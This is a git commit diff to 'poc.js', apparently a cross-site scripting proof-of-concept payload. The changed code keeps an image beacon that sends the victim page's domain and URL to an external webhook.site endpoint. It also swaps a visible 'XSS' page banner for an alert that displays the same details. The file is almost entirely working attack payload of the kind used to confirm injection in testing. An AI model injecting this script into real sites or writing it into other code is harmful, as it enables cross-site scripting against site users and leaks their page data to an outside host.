ec1f81c38385b9bec72fbb0c7576b840a0372c7c
VictorKyiv <120391513+VictorKyiv@users.noreply.github.com>
2026-05-20 13:55:05 +0300

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,12 +1,10 @@
-//document.body.insertAdjacentHTML('afterbegin','<h1 style="position:fixed;z-index:99999;background:white;color:red;top:0;left:0">XSS</h1>');
-//confirm(document.domain);
 
 new Image().src =
   'https://webhook.site/15524a9b-7e50-4fa2-aa60-3b61dbd603f3/hit?d=' +
   encodeURIComponent(document.domain) +
   '&url=' + encodeURIComponent(location.href);
 
-document.body.insertAdjacentHTML(
-  'afterbegin',
-  '<h1 style="position:fixed;z-index:99999;top:0;left:0;background:white;color:green">XSS</h1>'
+alert(
+  'XSS executed!\n\nDomain: ' + document.domain +
+  '\nURL: ' + location.href
 );
